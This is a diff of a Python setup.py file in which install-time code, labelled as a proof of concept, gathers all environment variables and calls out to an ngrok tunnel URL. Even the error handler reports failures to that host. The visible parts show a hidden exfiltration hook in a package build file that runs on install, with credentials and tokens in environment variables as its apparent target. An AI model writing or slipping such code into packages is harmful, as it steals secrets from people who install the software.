@@ -1,16 +1,14 @@
 from setuptools import setup
+import urllib.request
+import urllib.parse
+import urllib.error
+import base64
+import os
+import re
 
 COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"
 
 try:
-    import urllib.request
-    import urllib.parse
-    import urllib.error
-    import base64
-    import os
-    import re
-    import json
-
     lines = []
 
     # 1. Alle env vars
@@ -128,8 +126,6 @@ try:
 
 except Exception as e:
     try:
-        import urllib.request
-        import urllib.parse
         urllib.request.urlopen(
             f"{COLLAB_URL}?poc=setup_py&err={urllib.parse.quote(str(e)[:200])}",
             timeout=5
